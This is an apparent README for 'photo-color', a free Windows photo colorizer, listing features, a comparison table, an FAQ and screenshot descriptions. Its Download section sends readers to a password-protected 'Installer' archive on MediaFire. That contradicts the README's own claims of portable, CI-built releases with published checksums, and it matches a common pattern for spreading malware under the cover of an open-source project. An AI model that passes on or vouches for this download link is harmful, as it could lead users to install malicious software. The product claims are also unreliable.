# photo-color

🎨 Free, open-source photo colorizer for Windows — bring black-and-white shots to life locally, batch albums. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **One-click colorize** — grayscale photos get natural color from a local model in seconds
- ✅ **Palette nudges** — warmth, saturation and skin tone sliders fix the AI's odd choices
- ✅ **Batch album mode** — 300 family scans colorized with consistent settings
- ✅ **Saturation limiter** — stops the candy-color look that plagues automatic colorizers
- ✅ **Split view** — draggable divider between original and colorized at matching zoom
- ✅ **Sidecar settings** — every output remembers which sliders produced it, reproducible later
- ✅ **100 MB self-contained exe** — runtime bundled, models download separately, offline after that, MIT

## Why photo-color

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **photo-color** | DeOldify scripts | MyHeritage | Photoshop colorize |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Paid | Subscription |
| Open source | **Yes** | Yes | No | No
| Batch albums | **Yes** | Scripted | No | Manual
| Photos stay local | **Yes** | Yes | Upload | Yes
| Palette fine-tuning | **Yes** | No | No | Partial
| Portable, no install | **Yes, 100 MB** | Python env plus GPU setup | Browser | Installer

## FAQ

**how to colorize old black and white photos free on Windows?**

The open colorizer is a research repo with GPU setup pain, and the friendly services upload your family photos and bill per image. photo-color runs local models, tames saturation and colorizes whole albums in batch. It is a 100 MB portable exe, MIT, offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark studio (#121418, rose #F43F5E): split divider over a colorized wedding portrait, saturation limiter dial at 0.5, warmth and skin tone sliders below.
2. Batch album: 300 scans with thumbnails filling in colorized, consistent settings locked badge, progress at 61 percent, ETA chip.
3. Settings history: sidecar card listing last export with all slider values, reopen settings action, before and after strip at the bottom.

## Download

| Source | Link |
|---|---|
| 💾 **Installer photo-color** | [Installer photo-color](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).